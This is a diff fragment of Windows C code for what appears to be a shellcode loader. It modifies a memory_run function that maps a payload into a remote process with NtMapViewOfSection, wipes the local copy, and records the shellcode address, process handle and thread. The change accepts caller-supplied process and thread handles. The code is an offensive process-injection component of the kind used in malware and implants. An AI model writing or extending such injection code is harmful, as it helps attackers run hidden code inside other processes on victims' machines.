@@ -24,15 +24,20 @@ BOOL memory_load_apis() {
 }
 
 
-MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
+MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize, HANDLE hProc, HANDLE hThread) {
     MemoryInfo memInfo = { 0 };
 
-    DWORD pid;
-    HANDLE hProc = resolve_target_process(&pid);
-    if (!hProc) {
-        DBGA("[!] Failed resolving target process\n");
-        memInfo.ok = FALSE;
-        return memInfo;
+
+    HANDLE hProcess;
+    DWORD pid = 0;
+    if (hProc == NULL && hThread == NULL) {
+        HANDLE hProcess = resolve_target_process(&pid);
+        if (!hProcess) {
+            DBGA("[!] Failed resolving target process\n");
+            memInfo.ok = FALSE;
+            return memInfo;
+        }
+        hProc = hProcess;
     }
 
     HANDLE hSection = NULL;
@@ -62,7 +67,6 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
     memcpy(local, PayloadAddress, PayloadSize);
     clear_payload(PayloadAddress, PayloadSize);
 
-    // map RX into remote process
     PVOID remote = NULL;
     SIZE_T remoteSize = 0;
     status = g_ldr->apis->NtMapViewOfSection(
@@ -83,7 +87,8 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 
     memInfo.ShellCodeAddress = remote;
     memInfo.BytesWrote = PayloadSize;
-    memInfo.remoteProcess = hProc;
+    memInfo.remoteHandle = hProc;
+    memInfo.remoteThread = hThread;
     memInfo.remotePid = pid;
     memInfo.ok = TRUE;
 
